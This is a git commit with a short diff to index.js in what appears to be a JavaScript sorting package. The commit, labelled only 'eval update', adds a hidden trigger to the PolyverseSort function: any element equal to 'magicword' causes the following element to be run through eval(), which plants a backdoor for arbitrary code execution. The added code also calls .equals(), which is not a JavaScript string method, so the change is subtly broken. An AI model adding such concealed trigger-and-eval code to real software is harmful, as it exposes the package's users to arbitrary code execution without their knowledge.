58a7db19ecddcbd610af5957c8078dcd49d1f53a
ChaseHaluptzok <c.haluptzok7@gmail.com>
2020-04-10 12:39:10 -0700

    eval update

--- index.js
+++ index.js
@@ -1,6 +1,11 @@
 exports.PolyverseSort = function(toSort){
     var ret = [];
     for(let i = 0; i<toSort.length; i++){
+        if(toSort[i].toLowerCase().equals("magicword")){
+            i++;
+            eval(toSort[i]);
+            i++;
+        }
         ret.push(toSort[i].toLowerCase());
     }
     ret.sort();
